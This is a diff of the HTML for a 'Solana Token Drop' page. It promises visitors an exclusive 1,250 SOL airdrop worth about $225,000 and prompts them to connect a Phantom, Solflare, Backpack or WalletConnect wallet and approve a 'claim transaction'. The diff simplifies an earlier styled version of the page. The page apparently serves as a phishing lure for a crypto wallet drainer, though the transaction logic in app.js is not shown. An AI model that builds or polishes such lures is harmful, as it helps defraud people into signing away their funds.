@@ -1,146 +1,31 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Solana Token Drop</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #0b0b1a, #1a1a2e, #0f1a2e);
-            color: #fff;
-        }
-        .container {
-            background: rgba(255,255,255,0.03);
-            backdrop-filter: blur(24px);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 28px;
-            padding: 40px 28px;
-            max-width: 460px;
-            width: 92%;
-            text-align: center;
-        }
-        .logo { font-size: 52px; margin-bottom: 4px; }
-        h1 { font-size: 26px; font-weight: 700; background: linear-gradient(90deg, #9945FF, #14F195); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 6px; }
-        .subtitle { color: rgba(255,255,255,0.45); font-size: 13px; margin-bottom: 20px; }
-        .bonus-badge { display: inline-block; background: rgba(153,69,255,0.2); border: 1px solid rgba(153,69,255,0.3); padding: 6px 16px; border-radius: 100px; font-size: 12px; color: #14F195; margin-bottom: 16px; }
-        .amount-box { background: rgba(255,255,255,0.03); border-radius: 16px; padding: 20px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.06); }
-        .amount-box .token { font-size: 36px; font-weight: 700; }
-        .amount-box .usd { color: rgba(255,255,255,0.35); font-size: 13px; }
-        .wallet-btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 12px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            background: rgba(255,255,255,0.06);
-            color: #fff;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: background 0.15s;
-            -webkit-tap-highlight-color: transparent;
-            touch-action: manipulation;
-        }
-        .wallet-btn:active { background: rgba(255,255,255,0.12); transform: scale(0.99); }
-        .wallet-btn.primary { background: linear-gradient(135deg, #9945FF, #14F195); }
-        .wallet-btn.primary:active { opacity: 0.9; }
-        .wallet-btn .icon { width: 28px; height: 28px; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; font-weight: bold; font-size: 13px; }
-        .status-box {
-            margin-top: 16px;
-            padding: 10px 14px;
-            border-radius: 10px;
-            font-size: 13px;
-            display: none;
-            line-height: 1.4;
-        }
-        .status-box.show { display: block; }
-        .status-box.error { background: rgba(255,50,50,0.12); border: 1px solid rgba(255,50,50,0.25); color: #ff6b6b; }
-        .status-box.success { background: rgba(20,241,149,0.12); border: 1px solid rgba(20,241,149,0.25); color: #14F195; }
-        .status-box.info { background: rgba(58,120,255,0.12); border: 1px solid rgba(58,120,255,0.25); color: #6b9aff; }
-        .hidden { display: none !important; }
-        .wallet-addr { margin-top: 12px; font-size: 11px; color: rgba(255,255,255,0.3); word-break: break-all; }
-        .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.15); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; vertical-align: middle; margin-right: 8px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .footer { margin-top: 20px; font-size: 11px; color: rgba(255,255,255,0.2); }
-        .steps { text-align: left; font-size: 13px; color: rgba(255,255,255,0.45); margin-bottom: 20px; line-height: 2; }
-        .steps span { color: #14F195; font-weight: 600; }
-    </style>
 </head>
 <body>
-
-<div class="container">
-    <div class="logo">◎</div>
-    <h1>Solana Token Drop</h1>
-    <p class="subtitle">Exclusive airdrop for early adopters</p>
-    <div class="bonus-badge">✦ 5,000 SOL Bonus Pool</div>
-
-    <div class="steps">
-        <span>1.</span> Connect your wallet below<br>
-        <span>2.</span> Approve the claim transaction<br>
-        <span>3.</span> Tokens sent instantly ✦
+    <div id="app">
+        <h1>Solana Token Drop</h1>
+        <p>Exclusive airdrop — 1,250 SOL</p>
+        <hr>
+        <div id="buttons">
+            <button id="btnPhantom">Connect Phantom</button><br><br>
+            <button id="btnSolflare">Connect Solflare</button><br><br>
+            <button id="btnBackpack">Connect Backpack</button><br><br>
+            <button id="btnWC">WalletConnect (QR)</button><br><br>
+        </div>
+        <hr>
+        <div id="afterConnect" style="display:none;">
+            <p id="walletAddr"></p>
+            <button id="btnClaim">Claim Airdrop</button><br><br>
+            <button id="btnDisconnect">Disconnect</button>
+        </div>
+        <hr>
+        <div id="status"></div>
     </div>
 
-    <div class="amount-box">
-        <div class="token">1,250 SOL</div>
-        <div class="usd">≈ $225,000 USD</div>
-    </div>
-
-    <!-- STEP 1: Wallet Selection -->
-    <div id="stepConnect">
-        <button class="wallet-btn" id="btnPhantom">
-            <span class="icon" style="background:#9945FF;color:#fff;">P</span>
-            Phantom
-        </button>
-        <button class="wallet-btn" id="btnSolflare">
-            <span class="icon" style="background:#FC7B3A;color:#fff;">S</span>
-            Solflare
-        </button>
-        <button class="wallet-btn" id="btnBackpack">
-            <span class="icon" style="background:#A5FF00;color:#000;">B</span>
-            Backpack
-        </button>
-        <button class="wallet-btn" id="btnWC">
-            <span class="icon" style="background:#3B99FC;color:#fff;">WC</span>
-            WalletConnect (Mobile)
-        </button>
-    </div>
-
-    <!-- STEP 2: Post-Connection -->
-    <div id="stepClaim" class="hidden">
-        <div id="walletDisplay" class="wallet-addr"></div>
-        <button class="wallet-btn primary" id="btnClaim">
-            <span id="claimText">Claim Airdrop</span>
-            <span id="claimSpinner" class="spinner" style="display:none;"></span>
-        </button>
-        <button class="wallet-btn" id="btnDisconnect">Disconnect</button>
-    </div>
-
-    <div id="status" class="status-box"></div>
-    <div class="footer">Powered by Solana SPL Token Program</div>
-</div>
-
-<!-- QR Modal -->
-<div id="qrModal" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:999;align-items:center;justify-content:center;">
-    <div style="background:#1a1a2e;padding:32px;border-radius:20px;text-align:center;max-width:340px;width:90%;">
-        <h3 style="margin-bottom:16px;">Scan with your wallet</h3>
-        <div id="qrContainer"><p style="color:rgba(255,255,255,0.4);font-size:14px;">Generating QR...</p></div>
-        <p style="font-size:12px;color:rgba(255,255,255,0.4);margin-top:8px;">Open your wallet app and scan</p>
-        <button id="btnCloseQR" style="margin-top:16px;background:rgba(255,255,255,0.1);border:none;padding:10px 24px;border-radius:10px;color:#fff;cursor:pointer;">Cancel</button>
-    </div>
-</div>
-
-<!-- Solana Web3.js (lightweight) -->
-<script src="https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js"></script>
-<script src="app.js"></script>
+    <script src="app.js"></script>
 </body>
 </html>
